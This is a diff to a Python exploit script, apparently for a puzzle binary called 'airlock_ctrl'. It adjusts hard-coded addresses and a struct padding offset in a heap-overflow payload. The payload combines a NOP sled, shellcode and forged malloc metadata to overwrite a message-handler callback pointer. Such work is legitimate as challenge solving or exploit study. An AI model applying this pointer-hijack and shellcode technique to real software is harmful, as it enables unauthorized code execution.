@@ -9,9 +9,9 @@ EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
 context.binary = EXE_PATH
 
 # HandleSetSuitOccupant
-ORIGINAL_FUNCTION_ADDRESS = 0x555555555e7e
+ORIGINAL_FUNCTION_ADDRESS = 0x55555555671d
 # ControlDoor
-INJECT_FUNCTION_ADDRESS = 0x555555555269
+INJECT_FUNCTION_ADDRESS = 0x555555555333
 # message_serialization_buffer
 BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
 # message_handlers
@@ -23,8 +23,8 @@ BUFFER_SIZE = 256
 # message is 16 byte header + uint32_t user_id
 FIXED_MESSAGE_SIZE = 20
 
-# The SDNHandler is 4 bytes SDNMsgType followed by 8 bytes sdn_msg_callback_t. HandleSetSuitOccupant is the first entry.
-CALLBACK_HEAP_ADDRESS = HANDLERS_ADDRESS + 4
+# The SDNHandler is 4 bytes SDNMsgType followed 4 bytes padding and 8 bytes sdn_msg_callback_t. HandleSetSuitOccupant is the first entry.
+CALLBACK_HEAP_ADDRESS = HANDLERS_ADDRESS + 8
 
 # offset of user_id in SDNSetSuitOccupantMessage
 CHECK_VALUE_OFFSET = 16
@@ -110,7 +110,8 @@ filler += asm('nop') * extra_filler
 payload = filler
 payload += sh
 payload += MALLOC_META_DATA
-payload += p32(SDN_MSG_TYPE_SET_SUIT_OCCUPANT) + p64(BUFFER_STACK_ADDRESS + filler_len + FIXED_MESSAGE_SIZE)
+# Structure of SDNHandler
+payload += p32(SDN_MSG_TYPE_SET_SUIT_OCCUPANT) + p32(0) + p64(BUFFER_STACK_ADDRESS + filler_len + FIXED_MESSAGE_SIZE)
 
 with open('./bin/hack_good', 'wb') as fd:
     fd.write(payload)
